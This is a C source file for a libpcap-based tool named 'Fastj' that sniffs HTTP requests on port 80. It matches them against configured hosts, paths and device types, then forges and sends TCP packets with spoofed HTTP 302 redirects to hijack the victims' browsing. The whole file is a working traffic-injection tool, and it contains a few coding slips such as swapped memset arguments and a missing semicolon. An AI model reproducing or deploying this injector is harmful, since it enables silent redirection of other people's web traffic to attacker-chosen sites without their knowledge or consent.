#define APP_NAME        "Fastj"
#define APP_DESC        "Http inject using libpcap"
#define APP_COPYRIGHT    "Copyright (c) 2018"
#define APP_DISCLAIMER    "Write By XiaodongPan."

#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <time.h>
#include <errno.h>
#include <stdarg.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>

#include "picohttpparser.h"
#include "hash.h"
#include "slog.h"

#define BILLION 1000000000L

/*the number of a batch report */
#define REPORT_BATCH_NUM 1000

/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* read from uri need buffer line */
#define INPUT_BUF_LEN 1024

/* max url length, longer than 480 will be skiped */
#define MAX_URL_LEN 480

/* max host length */
#define MAX_HOST_LEN 32

/* url buffer length, should > MAX_URL_LEN+30 */
#define URL_BUF_LEN 512

#define PACKET_BUILD_LEN 1600

/* 
 * payload buffer length, limit to 512, so url in url.ini will 
 * be less than 512-50(the length of other in the 302 header)
 * length(url_302)<400 is a good choise 
 * */
#define PAYLOAD_BUF_LEN 512

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN    6



u_char g_packet[PACKET_BUILD_LEN];
hashtable_t *g_dict;
char g_config[] = "conf/online.ini";

//u_char g_local_mac[] = {0x00, 0x16, 0x3e, 0x30, 0x7d, 0x82};
//u_char g_gateway_mac[] = {0xee, 0xff, 0xff, 0xff, 0xff, 0xff};
uint8_t g_local_mac[] = {0xF8, 0xBC, 0x12, 0x38, 0xA7, 0xBC};
uint8_t g_gateway_mac[] = {0x4c, 0xb1, 0x6c, 0x8b, 0x8f, 0x39};

typedef struct http_header {
    char host[MAX_HOST_LEN];
    char path[MAX_URL_LEN];
    int platform;
} http_header_t;


/* Ethernet header */
struct sniff_ethernet {
    u_char ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
    u_char ether_shost[ETHER_ADDR_LEN];    /* source host address */
    u_short ether_type;                     /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
    u_char ip_vhl;                 /* version << 4 | header length >> 2 */
    u_char ip_tos;                 /* type of service */
    u_short ip_len;                 /* total length */
    u_short ip_id;                  /* identification */
    u_short ip_off;                 /* fragment offset field */
#define IP_RF 0x8000            /* reserved fragment flag */
#define IP_DF 0x4000            /* dont fragment flag */
#define IP_MF 0x2000            /* more fragments flag */
#define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
    u_char ip_ttl;                 /* time to live */
    u_char ip_p;                   /* protocol */
    u_short ip_sum;                 /* checksum */
    struct in_addr ip_src, ip_dst;  /* source and dest address */
};
#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)
#define IP_ADDR_LEN 4

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
    u_short th_sport;               /* source port */
    u_short th_dport;               /* destination port */
    tcp_seq th_seq;                 /* sequence number */
    tcp_seq th_ack;                 /* acknowledgement number */
    u_char th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
    u_char th_flags;
#define TH_FIN  0x01
#define TH_SYN  0x02
#define TH_RST  0x04
#define TH_PUSH 0x08
#define TH_ACK  0x10
#define TH_URG  0x20
#define TH_ECE  0x40
#define TH_CWR  0x80
#define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
    u_short th_win;                 /* window */
    u_short th_sum;                 /* checksum */
    u_short th_urp;                 /* urgent pointer */
};

char *get_relocation_url(hashtable_t *dict, http_header_t *header);

int find_platform(const char *agent, size_t len);

int get_http_header(const char *header, size_t header_len, http_header_t *http_header);

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

void print_payload(const u_char *payload, int len);

void print_hex_ascii_line(const u_char *payload, int len, int offset);

void print_app_banner(void);

void print_app_usage(void);

void swap_bytes(void *a, void *b, size_t width);

int build_packet(u_char *packet, char *relocation_url);

void read_config(hashtable_t *hash, char *config);

uint16_t ip_chksum(uint16_t initcksum, uint8_t *ptr, int len);

uint16_t tcp_chksum(uint16_t initcksum, uint8_t *tcphead, int tcplen, uint32_t *srcaddr, uint32_t *destaddr);

int str2mac(const char *macaddr, unsigned char mac[6]);

void debug_printf(const char *format, ...);

void debug_printf(const char *format, ...) {
    va_list arglist;

    time_t rawtime;
    struct tm *timeinfo;

    time(&rawtime);
    timeinfo = localtime(&rawtime);

    printf("%.24s: ", asctime(timeinfo));

    va_start(arglist, format);
    vprintf(format, arglist);
    va_end(arglist);
}


int str2mac(const char *macaddr, unsigned char mac[6]) {
    unsigned int m[6];
    if (sscanf(macaddr, "%02x:%02x:%02x:%02x:%02x:%02x",
               &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) != 6) {
        printf("Failed to parse mac address '%s'", macaddr);
        return -1;
    } else {
        mac[0] = m[0];
        mac[1] = m[1];
        mac[2] = m[2];
        mac[3] = m[3];
        mac[4] = m[4];
        mac[5] = m[5];
        return 0;
    }
}


uint16_t ip_chksum(uint16_t initcksum, uint8_t *ptr, int len) {
    unsigned int cksum;
    int idx;
    int odd;

    cksum = (unsigned int) initcksum;

    odd = len & 1;
    len -= odd;

    for (idx = 0; idx < len; idx += 2) {
        cksum += ((unsigned long) ptr[idx] << 8) + ((unsigned long) ptr[idx + 1]);
    }

    if (odd) {      /* buffer is odd length */
        cksum += ((unsigned long) ptr[idx] << 8);
    }

    /*
     * Fold in the carries
     */

    while (cksum >> 16) {
        cksum = (cksum & 0xFFFF) + (cksum >> 16);
    }

    return cksum;
}

uint16_t tcp_chksum(uint16_t initcksum, uint8_t *tcphead, int tcplen, uint32_t *srcaddr, uint32_t *destaddr) {
    uint8_t pseudoheader[12];
    uint16_t calccksum;

    memcpy(&pseudoheader[0], srcaddr, IP_ADDR_LEN);
    memcpy(&pseudoheader[4], destaddr, IP_ADDR_LEN);
    pseudoheader[8] = 0;
    pseudoheader[9] = IPPROTO_TCP;
    pseudoheader[10] = (tcplen >> 8) & 0xFF;
    pseudoheader[11] = (tcplen & 0xFF);

    calccksum = ip_chksum(0, pseudoheader, sizeof(pseudoheader));
    calccksum = ip_chksum(calccksum, tcphead, tcplen);
    calccksum = ~calccksum;
    return calccksum;
}


void read_config(hashtable_t *hash, char *config) {
    char *domain, *path, *redirect;
    int chance, platform, match;
    char *search = "|";
    char line[INPUT_BUF_LEN];

    FILE *file = fopen(config, "r");
    if (file != NULL) {
        while (fgets(line, sizeof line, file) != NULL) {
            chance = atoi(strtok(line, search));
            match = atoi(strtok(NULL, search));
            platform = atoi(strtok(NULL, search));
            domain = strtok(NULL, search);
            path = strtok(NULL, search);
            redirect = strtok(NULL, search);
            //printf("%s %s --> %s", domain, path, redirect);
            elem_t *elem = (elem_t *) malloc(sizeof(elem_t));
            elem->chance = chance;
            elem->match = match;
            elem->platform = platform;
            strcpy(elem->domain, domain);
            strcpy(elem->path, path);
            strcpy(elem->redirect, redirect);
            elem->next = NULL;

            ht_set(hash, domain, elem);
        }
        fclose(file);
    } else {
        printf("file %s not exist!\n", config);
    }
}


/* platform: 0: all,  1, android, 2, ios, 3, mobile, 4, pc */
int find_platform(const char *agent, size_t len) {
    if (strnstr(agent, "iPhone", len) != NULL) {
        return 1;
    }

    if (strnstr(agent, "Android", len) != NULL) {
        return 2;
    }

    return 4;
}

char *get_relocation_url(hashtable_t *dict, http_header_t *header) {
    elem_t *elem = NULL;
    elem = ht_get(dict, header->host);

    // domain not match, return
    if (elem == NULL) {
        return NULL;
    }

    while (elem != NULL) {
        // reg match
        // platform: 0: all,  1, android, 2, ios, 3, mobile, 4, pc
        if (elem->match == 0) {
            if ((strstr(header->path, elem->path) != NULL) &&
                (elem->platform == 0 ||
                 elem->platform == header->platform ||
                 (elem->platform == 3 && (header->platform == 1 || header->platform == 2)))) {
                return elem->redirect;
            }
        } else {
            if ((strcmp(header->path, elem->path) == 0) &&
                (elem->platform == 0 ||
                 elem->platform == header->platform ||
                 (elem->platform == 3 && (header->platform == 1 || header->platform == 2)))) {
                return elem->redirect;
            }
        }
        elem = elem->next;
    }

    return NULL;
}


/*
 * get http header, the max url length limit to 480, 480+7+16<512
 * */
int get_http_header(const char *header, size_t header_len, http_header_t *http_header) {
    const char *method, *path;
    struct phr_header headers[16];
    size_t method_len, path_len, num_headers;
    int ret = 0, i, minor_version;
    int flag = -3;

    num_headers = 16;
    ret = phr_parse_request(header, header_len, &method, &method_len, &path, &path_len,
                            &minor_version, headers, &num_headers, 0);
    if (path_len > MAX_URL_LEN) {
        printf("path is very long, size: %ld\n", path_len);
        return flag;
    }

    // copy path to header
    sprintf(http_header->host, "%.*s", path_len, path);
    flag++;


    if (ret == header_len) {
        for (i = 0; i != num_headers; ++i) {
            if (headers[i].name_len == 4 && memcmp("Host", headers[i].name, 4) == 0) {
                sprintf(http_header->host, "%.*s", (int) headers[i].value_len, headers[i].value);
                flag++;
            } else if (headers[i].name_len == 10 && memcmp("User-Agent", headers[i].name, 10) == 0) {
                http_header->platform = find_platform(headers[i].value, headers[i].value_len);
                flag++;
            }

        }
    }
    return flag;
}

/*
 * app name/banner
 */
void print_app_banner(void) {

    printf("%s - %s\n", APP_NAME, APP_DESC);
    printf("%s\n", APP_COPYRIGHT);
    printf("%s\n", APP_DISCLAIMER);
    printf("\n");
}

/*
 * print help text
 */
void print_app_usage(void) {
    printf("Usage: fastj capdev senddev sendmac gatemac\n");
}

/*
 * print data in rows of 16 bytes: offset   hex   ascii
 *
 * 00000   47 45 54 20 2f 20 48 54  54 50 2f 31 2e 31 0d 0a   GET / HTTP/1.1..
 */
void print_hex_ascii_line(const u_char *payload, int len, int offset) {

    int i;
    int gap;
    const u_char *ch;

    /* offset */
    printf("%05d   ", offset);

    /* hex */
    ch = payload;
    for (i = 0; i < len; i++) {
        printf("%02x ", *ch);
        ch++;
        /* print extra space after 8th byte for visual aid */
        if (i == 7)
            printf(" ");
    }
    /* print space to handle line less than 8 bytes */
    if (len < 8)
        printf(" ");

    /* fill hex gap with spaces if not full line */
    if (len < 16) {
        gap = 16 - len;
        for (i = 0; i < gap; i++) {
            printf("   ");
        }
    }
    printf("   ");

    /* ascii (if printable) */
    ch = payload;
    for (i = 0; i < len; i++) {
        if (isprint(*ch))
            printf("%c", *ch);
        else
            printf(".");
        ch++;
    }

    printf("\n");

    return;
}

/*
 * print packet payload data (avoid printing binary data)
 */
void print_payload(const u_char *payload, int len) {

    int len_rem = len;
    int line_width = 16;            /* number of bytes per line */
    int line_len;
    int offset = 0;                    /* zero-based offset counter */
    const u_char *ch = payload;

    if (len <= 0)
        return;

    /* data fits on one line */
    if (len <= line_width) {
        print_hex_ascii_line(ch, len, offset);
        return;
    }

    /* data spans multiple lines */
    for (;;) {
        /* compute current line length */
        line_len = line_width % len_rem;
        /* print line */
        print_hex_ascii_line(ch, line_len, offset);
        /* compute total remaining */
        len_rem = len_rem - line_len;
        /* shift pointer to remaining bytes to print */
        ch = ch + line_len;
        /* add offset */
        offset = offset + line_width;
        /* check if we have line width chars or less */
        if (len_rem <= line_width) {
            /* print last line and get out */
            print_hex_ascii_line(ch, len_rem, offset);
            break;
        }
    }
}


void swap_bytes(void *a, void *b, size_t width) {
    char *v1 = (char *) a;
    char *v2 = (char *) b;
    char tmp;
    size_t i;

    for (i = 0; i < width; i++) {
        tmp = v1[i];
        v1[i] = v2[i];
        v2[i] = tmp;
    }
}

int build_packet(u_char *packet, char *relocation_url) {
    struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
    struct sniff_ip *ip;              /* The IP header */
    struct sniff_tcp *tcp;            /* The TCP header */
    char *payload, *option;
    char payload302[PAYLOAD_BUF_LEN];
    int packet_len;
    int size_ip, size_tcp, size_option, size_payload, new_size_payload;
    u_int16_t sport, dport, sum;
    u_int32_t seq, ack;

    // memset
    //memset(payload302, 0, PAYLOAD_BUF_LEN);

    // set mac
    ethernet = (struct sniff_ethernet *) (packet);
    //swap_bytes(ethernet->ether_dhost, ethernet->ether_shost, ETHER_ADDR_LEN);
    memcpy(ethernet->ether_dhost, g_gateway_mac, ETHER_ADDR_LEN);
    memcpy(ethernet->ether_shost, g_local_mac, ETHER_ADDR_LEN);

    // set ip (src, dst, checksum)
    ip = (struct sniff_ip *) (packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip) * 4;
    swap_bytes((void *) &ip->ip_src, (void *) &ip->ip_dst, 4);

    // tcp
    tcp = (struct sniff_tcp *) (packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp) * 4;

    option = (char *) (packet + SIZE_ETHERNET + size_ip + sizeof(struct sniff_tcp));
    size_option = size_tcp - sizeof(struct sniff_tcp);
    if (size_option > 0) {
        memset(option, 0, size_option);
    }

    slog_debug(3, "option len: %d\n", size_option);

    sport = tcp->th_sport;
    dport = tcp->th_dport;
    tcp->th_sport = dport;
    tcp->th_dport = sport;
    tcp->th_flags = TH_PUSH | TH_ACK;


    payload = (char *) (packet + SIZE_ETHERNET + size_ip + size_tcp);
    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

    seq = ntohl(tcp->th_ack);
    ack = ntohl(tcp->th_seq) + size_payload;
    tcp->th_seq = htonl(seq);
    tcp->th_ack = htonl(ack);


    // set payload
    new_size_payload = sprintf(payload302,
                               "HTTP/1.1 302 Found\r\nLocation: %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n",
                               relocation_url);
    new_size_payload--;

    memcpy(payload, payload302, new_size_payload);
    ip->ip_len = htons(size_ip + size_tcp + new_size_payload);
    packet_len = SIZE_ETHERNET + size_ip + size_tcp + new_size_payload;

    slog_debug(3, "payload302:%s\n", payload302);
    slog_debug(3, "size_payload:%d, size_eth: %d, size_ip: %d, size_tcp: %d, packet_len: %d\n",
                 new_size_payload, SIZE_ETHERNET, size_ip, size_tcp, packet_len);

    ip->ip_sum = 0;
    sum = ip_chksum(0, (uint8_t *) ip, size_ip);
    ip->ip_sum = htons(~sum);


    tcp->th_sum = 0;
    sum = tcp_chksum(0, (uint8_t *) tcp, size_tcp + new_size_payload, &(ip->ip_src.s_addr), &(ip->ip_dst.s_addr));
    tcp->th_sum = htons(sum);

    return packet_len;
}

/*
 * dissect/print packet
 */
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    /* declare pointers to packet headers */
    const struct sniff_ip *ip;              /* The IP header */
    const struct sniff_tcp *tcp;            /* The TCP header */
    const char *payload;                    /* Packet payload */
    char *relocation_url;
    http_header_t req_http_header;
    int size_ip;
    int size_tcp;
    int size_payload;
    int size_packet;
    int size_send;

    /* qps handle */
    static int count = 0;
    static struct timespec old;
    static struct timespec new;
    uint64_t diff_nsec = 0;
    time_t ltime;

    if (count % REPORT_BATCH_NUM == 0) {
        clock_gettime(CLOCK_MONOTONIC, &new);
        if (count != 0) {
            diff_nsec = (BILLION * (new.tv_sec - old.tv_sec));
            diff_nsec += new.tv_nsec - old.tv_nsec;
            float diff_sec = diff_nsec * 1e-9;
            float rate = REPORT_BATCH_NUM / diff_sec;
            ltime = time(NULL);
            printf("%.24s  count:%d, rate:%.3f\n", asctime(localtime(&ltime)), count, rate);
        }
        old = new;
    }
    count++;

    /* packet send handle */
    pcap_t *handle = (pcap_t *) args;

    //memset(req_url, 0 ,URL_BUF_LEN);

    /* define/compute ip header offset */
    ip = (struct sniff_ip *) (packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip) * 4;
    if (size_ip < 20) {
        printf("   * Invalid IP header length: %u bytes\n", size_ip);
        return;
    }

    /* print source and destination IP addresses */
    slog_debug(4, "       From: %s\n", inet_ntoa(ip->ip_src));
    slog_debug(4, "         To: %s\n", inet_ntoa(ip->ip_dst));


    /* define/compute tcp header offset */
    tcp = (struct sniff_tcp *) (packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp) * 4;

    if (size_tcp < 20) {
        printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
        return;
    }


    slog_debug(4, "   Src port: %d\n", ntohs(tcp->th_sport));
    slog_debug(4, "   Dst port: %d\n", ntohs(tcp->th_dport));

    /* define/compute tcp payload (segment) offset */
    payload = (char *) (packet + SIZE_ETHERNET + size_ip + size_tcp);

    /* compute tcp payload (segment) size */
    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

    size_packet = SIZE_ETHERNET + size_ip + size_tcp + size_payload;
    if (size_payload > 0) {
        slog_debug(4, "   Payload (%d bytes):\n", size_payload);


        // get http header
        int req = get_http_header(payload, size_payload, &req_http_header);
        if (req < 0) {
            slog_warn(2, " http header parse error\n");
            return;
        }
        slog_info(2, "Host: %s, Path: %s, Platform: %s\n", req_http_header.host,
                  req_http_header.path, req_http_header.platform)


        // get relocation url
        // 1, hash domain, 2, reg search path,  3, match platform
        relocation_url = get_relocation_url(g_dict, &req_http_header);
        //slog_debug(4, "relocation_url:%s\n", relocation_url);

        if (relocation_url == NULL) {
            return;
        }
        slog_info(2, "relocation_url:%s\n", relocation_url);

        memset(g_packet, PACKET_BUILD_LEN, 0);
        memcpy(g_packet, packet, size_packet);
        size_send = build_packet(g_packet, relocation_url);
        if (size_send > 0) {
            int send_ret = pcap_sendpacket(handle, g_packet, size_send);
            if (send_ret == 0) {
                slog_debug(3, "send packat succ\n");
            } else {
                slog_debug(3, "send packat fail\n");
            }
        }

    }

    return;
}

void usr1_list_hashtable(int dummy) {
    ht_list(g_dict);
}

void usr2_reload_config(int dummy) {
    read_config(g_dict, g_config);
}

int main(int argc, char **argv) {
    struct sigaction sa = {.sa_flags = 0,};

    sigemptyset(&sa.sa_mask);       /* clear signal set */
    sigaddset(&sa.sa_mask, SIGUSR1);
    sigaddset(&sa.sa_mask, SIGUSR2);

    sa.sa_handler = usr1_list_hashtable;
    sigaction(SIGUSR1, &sa, NULL);
    sa.sa_handler = usr2_reload_config;
    sigaction(SIGUSR2, &sa, NULL);


    char *cap_dev = NULL;            /* capture device name */
    char *send_dev = NULL;
    char *send_mac = NULL;
    char *gate_mac = NULL;
    char errbuf[PCAP_ERRBUF_SIZE];        /* error buffer */
    pcap_t *handle, *send_handle;                /* packet capture handle */

    char filter_exp[] = "tcp dst  port 80  and tcp[tcpflags] & tcp-push == tcp-push";
    struct bpf_program fp;            /* compiled filter program (expression) */
    bpf_u_int32 net = 0;            /* ip */
    int num_packets = -1;            /* number of packets to capture */

    print_app_banner();

    // init log
    slog_init("fastj", NULL, 2, 3, 1);

    /* check for capture device name on command-line */
    if (argc == 5) {
        // Usage: fastj capdev senddev sendmac gatemac
        cap_dev = argv[1];
        send_dev = argv[2];
        send_mac = argv[3];
        gate_mac = argv[4];
    } else {
        print_app_usage();
        exit(EXIT_FAILURE);
    }


    /* print capture info */
    slog_info(2, "cap_dev: %s, send_dev: %s, send_mac:%s , gate_mac:%s\n",
              cap_dev, send_dev, send_mac, gate_mac);
    slog_info(2, "Number of packets: %d\n", num_packets);
    slog_info(2, "Filter expression: %s\n", filter_exp);

    if (str2mac(send_mac, g_local_mac) < 0) {
        slog_error(1, "Paser send mac error, mac: %s\n", send_mac);
        exit(EXIT_FAILURE);
    }

    if (str2mac(gate_mac, g_gateway_mac) < 0) {
        slog_error(1, "Paser gateway mac error, mac: %s\n", gate_mac);
        exit(EXIT_FAILURE);
    }


    g_dict = ht_create(65536);
    read_config(g_dict, g_config);

    /* open capture device */
    handle = pcap_open_live(cap_dev, SNAP_LEN, 1, 1000, errbuf);
    if (handle == NULL) {
        slog_error(1, "Couldn't open device %s: %s\n", cap_dev, errbuf);
        exit(EXIT_FAILURE);
    }

    /* open send device */
    send_handle = pcap_open_live(send_dev, SNAP_LEN, 1, 1000, errbuf);
    if (send_handle == NULL) {
        slog_error(1, "Couldn't open device %s: %s\n", cap_dev, errbuf);
        exit(EXIT_FAILURE);
    }

    /* compile the filter expression */
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        slog_error(1, "Couldn't parse filter %s: %s\n",
                filter_exp, pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }

    /* apply the compiled filter */
    if (pcap_setfilter(handle, &fp) == -1) {
        slog_error(1, "Couldn't install filter %s: %s\n",
                filter_exp, pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }

    slog_info(2, "start inject...");
    /* now we can set our callback function */
    pcap_loop(handle, num_packets, got_packet, (u_char *) send_handle);

    /* cleanup */
    pcap_freecode(&fp);
    pcap_close(handle);
    pcap_close(send_handle);

    slog_info(2, "Capture complete.");

    return 0;
}



